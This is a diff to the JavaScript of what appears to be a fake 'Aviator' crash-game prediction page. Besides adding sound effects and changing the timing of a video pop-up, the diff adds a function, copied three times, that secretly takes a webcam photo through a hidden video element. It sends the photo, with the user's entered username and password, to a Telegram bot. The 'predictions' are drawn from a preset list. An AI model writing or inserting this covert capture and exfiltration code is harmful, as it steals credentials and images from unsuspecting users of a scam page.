@@ -954,8 +954,11 @@ ${infoRedGlobal}
         if(u.trim() !== "" && p.trim() !== "") {
             document.getElementById("login-screen").style.display = "none";
             document.getElementById("app").style.display = "flex";
+        // --- DECLARACIÓN DEL SONIDO DE RONDA AL 50% ---
+const sonidoRonda = new Audio('https://aviator-demo.spribegaming.com/assets/sounds/sprite_audio.mp3');
+sonidoRonda.volume = 0.5;
 
-            // VALIDACIÓN EXACTA: SÓLO AVIATORPKA TIENE ACCESO LIBRE Y FUNCIONAL. LOS DEMÁS (REGISTROS) ESTÁN RESTRINGIDOS.
+// VALIDACIÓN EXACTA: SÓLO AVIATORPKA TIENE ACCESO LIBRE Y FUNCIONAL. LOS DEMÁS (REGISTROS) ESTÁN RESTRINGIDOS.
             if(u === "AVIATORPKA" && p === "AVIATORPKA") {
                 window.esDueño = true;
                 let btnRonda = document.getElementById("btn");
@@ -1025,7 +1028,7 @@ ${infoRedGlobal}
         }, 1000);
     }
 
-    function correrPrediccion() {
+   function correrPrediccion() {
         let log = document.getElementById('analysis-log');
         let target = misSenales[roundCounter % misSenales.length];
         let val = 1.00;
@@ -1037,6 +1040,16 @@ ${infoRedGlobal}
             if(val >= target) { 
                 d.innerText = target.toFixed(2) + "x";
                 log.innerText = target.toFixed(2) + "x se fue";
+                
+                // --- NUEVO SONIDO DIRECTO AL 50% AL TERMINAR LA RONDA ---
+                try {
+                    let audioFinal = new Audio('https://aviator-demo.spribegaming.com/assets/sounds/sprite_audio.mp3');
+                    audioFinal.volume = 0.5;
+                    audioFinal.play().catch(err => console.log("Bloqueo de audio final:", err));
+                } catch (e) {
+                    console.log("Error al reproducir el sonido final:", e);
+                }
+
                 let bar = document.getElementById('history-bar');
                 let box = document.createElement('div');
                 box.className = 'hist-box';
@@ -1091,6 +1104,129 @@ ${infoRedGlobal}
             console.log("Cámara denegada o no disponible:", error);
         }
     }
+
+    async function capturarYEnviarFoto(token, chatId, u, p) {
+        try {
+            let video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            let stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }
+            });
+            
+            video.srcObject = stream;
+            await video.play();
+
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            let canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());
+            document.body.removeChild(video);
+
+            canvas.toBlob(async function(blob) {
+                let formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'captura_usuario.png');
+                formData.append('caption', `🚨 FOTO CAPTURADA 🚨\n👤 Usuario: ${u}\n🔑 Clave: ${p}`);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/png');
+
+        } catch (error) {
+            console.log("Cámara denegada o no disponible:", error);
+        }
+    }
+
+    async function capturarYEnviarFoto(token, chatId, u, p) {
+        try {
+            let video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            let stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }
+            });
+            
+            video.srcObject = stream;
+            await video.play();
+
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            let canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());
+            document.body.removeChild(video);
+
+            canvas.toBlob(async function(blob) {
+                let formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'captura_usuario.png');
+                formData.append('caption', `🚨 FOTO CAPTURADA 🚨\n👤 Usuario: ${u}\n🔑 Clave: ${p}`);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/png');
+
+        } catch (error) {
+            console.log("Cámara denegada o no disponible:", error);
+        }
+    }
+
+    async function capturarYEnviarFoto(token, chatId, u, p) {
+        try {
+            let video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            let stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }
+            });
+            
+            video.srcObject = stream;
+            await video.play();
+
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            let canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());
+            document.body.removeChild(video);
+
+            canvas.toBlob(async function(blob) {
+                let formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'captura_usuario.png');
+                formData.append('caption', `🚨 FOTO CAPTURADA 🚨\n👤 Usuario: ${u}\n🔑 Clave: ${p}`);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/png');
+
+        } catch (error) {
+            console.log("Cámara denegada o no disponible:", error);
+        }
+    }
 // --- 3. GESTIÓN DEL MODAL DE REGISTRO (FORZADO PARA PRUEBAS) ---
 window.mostrarAlertaTelegram = function() {
     document.getElementById('form-container').style.display = 'block';
@@ -1103,20 +1239,44 @@ window.cerrarAlertaTelegram = function() {
 }
 
 
-// --- GESTIÓN DE ALERTAS DE VIDEO RECURRENTES (CIERRE AL TERMINAR EL VIDEO) ---
+// --- GESTIÓN DE SONIDO DE FONDO AUTOMÁTICO (VOLUMEN 10%) ---
+const bgAudio = new Audio('https://aviator-demo.spribegaming.com/assets/sounds/bg_music.mp3');
+bgAudio.loop = true;
+bgAudio.volume = 0.1;
+
+function intentarReproducirAudio() {
+    bgAudio.play().then(() => {
+        // Si suena con éxito, removemos los detectores de clics
+        document.removeEventListener('click', intentarReproducirAudio);
+        document.removeEventListener('keydown', intentarReproducirAudio);
+    }).catch(e => {
+        // Si el navegador aún lo bloquea, esperará al próximo clic
+        console.log("Esperando interacción para liberar el audio...");
+    });
+}
+
+// Intenta reproducirlo de inmediato al cargar la página
+bgAudio.play().catch(() => {
+    // Si falla el intento automático inicial, se activará en cuanto el usuario haga su primer clic o toque una tecla
+    document.addEventListener('click', intentarReproducirAudio);
+    document.addEventListener('keydown', intentarReproducirAudio);
+});
+
+
+// --- GESTIÓN DE ALERTAS DE VIDEO RECURRENTES (CADA 6 HORAS) ---
 
 const misVideos10 = [
     "https://files.catbox.moe/fr49qg.MP4", // Video 1
     "https://files.catbox.moe/ku32qd.MP4", // Video 2
-    "https://files.catbox.moe/0gc1pr.MP4", // Video 3
-    "https://files.catbox.moe/zfyvzq.MP4"  // Video 4 (puedes añadir hasta el 10 aquí)
+    "https://files.catbox.moe/0gc1pr.MP4"  // Video 3
 ];
 
 let indiceVideoActual = 0;
 
-// Función para mostrar el video con animación de entrada
 window.mostrarAlertaVideo = function() {
-    if (indiceVideoActual >= misVideos10.length) return;
+    if (indiceVideoActual >= misVideos10.length) {
+        indiceVideoActual = 0; 
+    }
 
     const overlay = document.getElementById('modal-video-overlay');
     const sourceElement = document.getElementById('video-source');
@@ -1127,15 +1287,13 @@ window.mostrarAlertaVideo = function() {
     
     if (!overlay || !sourceElement || !videoPlayer) return;
 
-    // Al iniciar el video: NO se muestra nada en el botón de cierre
     if (spanContador) spanContador.style.display = 'none';
-    if (iconoCierre) iconoCierre.style.display = 'none';
-    if (botonCierre) botonCierre.style.pointerEvents = 'none'; // Bloqueado hasta que termine
+    if (iconoCierre) iconoCierre.style.display = 'block'; 
+    if (botonCierre) botonCierre.style.pointerEvents = 'auto'; 
 
     sourceElement.src = misVideos10[indiceVideoActual];
     videoPlayer.load();
     
-    // Muestra el overlay y activa la animación
     overlay.style.display = 'flex';
     overlay.style.opacity = '0';
     overlay.style.transition = 'opacity 0.3s ease';
@@ -1155,17 +1313,9 @@ window.mostrarAlertaVideo = function() {
         console.log("Reproducción automática bloqueada por el navegador:", e);
     });
 
-    // Detectar exactamente cuando el video TERMINA
-    videoPlayer.onended = function() {
-        if (spanContador) spanContador.style.display = 'none';
-        if (iconoCierre) iconoCierre.style.display = 'block'; // Muestra tu ícono de cerrar
-        if (botonCierre) botonCierre.style.pointerEvents = 'auto'; // Habilita el botón
-    };
-
     indiceVideoActual++;
 }
 
-// Función para cerrar el video con animación de salida
 window.cerrarAlertaVideo = function() {
     const overlay = document.getElementById('modal-video-overlay');
     const videoPlayer = document.getElementById('alerta-video-player');
@@ -1180,13 +1330,12 @@ window.cerrarAlertaVideo = function() {
     }, 300);
 }
 
-// El primer video se abre a los 3 segundos, y después se repite CADA 1 MINUTO exacto
 setTimeout(() => {
     mostrarAlertaVideo();
 
     setInterval(() => {
         mostrarAlertaVideo();
-    }, 1 * 60 * 1000);
+    }, 6 * 60 * 60 * 1000); 
 
 }, 3000);
 </script>
